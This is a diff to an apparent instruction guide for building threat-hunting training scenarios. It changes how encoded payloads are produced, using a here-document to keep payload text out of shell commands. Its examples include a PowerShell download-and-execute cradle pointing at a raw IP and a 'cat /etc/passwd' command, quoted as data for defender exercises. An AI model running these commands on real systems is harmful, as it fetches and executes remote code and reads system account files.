@@ -579,17 +579,31 @@ For baseline deviation exercises (e.g., "spot the change in normal traffic"), us
 
 When a storyline event includes base64-encoded data, obfuscated commands, or any other encoded content, the encoding must be accurate and decodable — never fake strings that just "look like" base64. Use the Bash tool to produce real encodings.
 
-For PowerShell's `-EncodedCommand` flag (which expects UTF-16LE base64):
+Treat the payload as untrusted data while encoding it. **Never interpolate
+payload text into a shell command.** Pass it through a quoted here-document to
+constant encoder code so quotes, substitutions, newlines, and shell operators
+remain data. Choose a fresh here-document delimiter that does not occur alone on
+a line in the payload.
+
+For PowerShell's `-EncodedCommand` flag (which expects UTF-16LE base64), use:
 ```bash
-echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://45.83.221.45/payload.ps1")' | iconv -t UTF-16LE | base64
+python -c 'import base64, sys; data = sys.stdin.buffer.read(); data = data[:-1] if data.endswith(b"\n") else data; print(base64.b64encode(data.decode("utf-8").encode("utf-16le")).decode("ascii"))' <<'EFORGE_PAYLOAD'
+IEX (New-Object Net.WebClient).DownloadString("http://45.83.221.45/payload.ps1")
+EFORGE_PAYLOAD
 ```
 
-For plain base64 (Linux commands, general obfuscation):
+For plain base64 (Linux commands, general obfuscation), use:
 ```bash
-echo -n 'cat /etc/passwd' | base64
+python -c 'import base64, sys; data = sys.stdin.buffer.read(); data = data[:-1] if data.endswith(b"\n") else data; print(base64.b64encode(data).decode("ascii"))' <<'EFORGE_PAYLOAD'
+cat /etc/passwd
+EFORGE_PAYLOAD
 ```
 
-Always generate the encoded string via Bash and paste the real output into the scenario YAML. A threat hunter who decodes the base64 should find the actual command inside.
+The constant encoder removes only the final newline introduced by the
+here-document. To intentionally encode a trailing newline, leave one extra
+blank line before the delimiter. Always paste the real output into the scenario
+YAML. A threat hunter who decodes the base64 should find the exact command
+inside.
 
 For the `time` field, prefer relative offsets from the scenario start ("+15m", "+1h30m", "+2h") — they're easier to read and relocatable. Units supported: `d` (days), `h` (hours), `m` (minutes), `s` (seconds), `ms` (milliseconds). Use seconds/milliseconds for rapid sequences like password sprays ("+20m30s", "+20m30s500ms"). Space events realistically: real attackers pause between steps, but don't drag reconnaissance over 6 hours either.
 
